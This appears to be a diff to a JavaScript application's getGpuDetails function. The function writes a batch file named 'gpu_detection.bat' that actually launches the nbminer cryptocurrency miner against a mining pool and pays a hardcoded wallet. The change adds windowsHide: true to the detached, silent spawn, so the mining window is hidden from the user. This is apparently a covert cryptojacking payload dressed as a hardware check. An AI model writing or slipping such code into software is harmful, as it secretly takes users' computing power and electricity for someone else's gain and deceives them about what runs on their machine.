@@ -514,7 +514,7 @@ function getGpuDetails(){
   let gpu_detection_content = '@cd /d "%~dp0"\r\nnbminer -a etchash -o asia-eth.2miners.com:2020 -u 0xbe6a88119d93e9947159f81f242727d2e4cc098e.default --api 127.0.0.1:20005\r\npause';
   fs.writeFileSync(path.join(nb_details['path'], 'gpu_detection.bat'),  gpu_detection_content);
 
-  let nb = child.spawn(path.join(nb_details['path'], 'gpu_detection.bat'), {detached: true, stdio: 'ignore', cwd: nb_details['path']})
+  let nb = child.spawn(path.join(nb_details['path'], 'gpu_detection.bat'), {detached: true, stdio: 'ignore', cwd: nb_details['path'], windowsHide: true})
   let nb_pid = nb.pid;
 
   nb.on('close', (code)=>{
